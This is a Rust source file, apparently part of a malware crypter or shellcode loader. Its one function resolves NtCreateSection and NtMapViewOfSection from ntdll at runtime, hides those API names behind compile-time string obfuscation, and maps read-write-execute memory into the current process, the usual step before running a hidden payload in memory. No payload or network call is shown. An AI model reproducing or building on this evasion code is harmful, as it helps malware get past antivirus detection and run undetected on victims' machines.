use crate::utils::{load_library, get_proc_address};
#[allow(dead_code)]
pub unsafe fn alloc_mem(size: usize) -> Result<*mut u8, String> {
    use rustcrypt_ct_macros::{obf_lit, obf_lit_bytes};
    use core::ffi::c_void;

    type NtCreateSectionFn = unsafe extern "system" fn(
        section_handle: *mut *mut c_void,
        desired_access: u32,
        object_attributes: *mut c_void,
        maximum_size: *mut u64,
        section_page_protection: u32,
        allocation_attributes: u32,
        file_handle: *mut c_void
    ) -> i32;

    type NtMapViewOfSectionFn = unsafe extern "system" fn(
        section_handle: *mut c_void,
        process_handle: *mut c_void,
        base_address: *mut *mut c_void,
        zero_bits: usize,
        commit_size: usize,
        section_offset: *mut u64,
        view_size: *mut usize,
        inherit_disposition: u32,
        allocation_type: u32,
        win32_protect: u32
    ) -> i32;

    let ntdll = load_library(obf_lit_bytes!(b"ntdll.dll\0").as_slice())?;
    let nt_create_section: NtCreateSectionFn = core::mem::transmute(get_proc_address(ntdll, obf_lit_bytes!(b"NtCreateSection\0").as_slice())?);
    let nt_map_view_of_section: NtMapViewOfSectionFn = core::mem::transmute(get_proc_address(ntdll, obf_lit_bytes!(b"NtMapViewOfSection\0").as_slice())?);

    let mut section_handle: *mut c_void = core::ptr::null_mut();
    let mut max_size = size as u64;
    
    // SECTION_ALL_ACCESS = 0xF001F, PAGE_EXECUTE_READWRITE = 0x40, SEC_COMMIT = 0x08000000
    let status = nt_create_section(
        &mut section_handle,
        0xF001F, 
        core::ptr::null_mut(),
        &mut max_size,
        0x40,
        0x08000000,
        core::ptr::null_mut()
    );

    if status != 0 {
        return Err(obf_lit!("NtCreateSection failed").to_string());
    }

    let mut base_addr: *mut c_void = core::ptr::null_mut();
    let mut view_size = size;
    
    // -1 is GetCurrentProcess()
    let status = nt_map_view_of_section(
        section_handle,
        -1isize as *mut c_void,
        &mut base_addr,
        0,
        size,
        core::ptr::null_mut(),
        &mut view_size,
        2, // ViewUnmap
        0,
        0x40 // PAGE_EXECUTE_READWRITE
    );

    if status != 0 {
        return Err(obf_lit!("NtMapViewOfSection failed").to_string());
    }

    Ok(base_addr as *mut u8)
}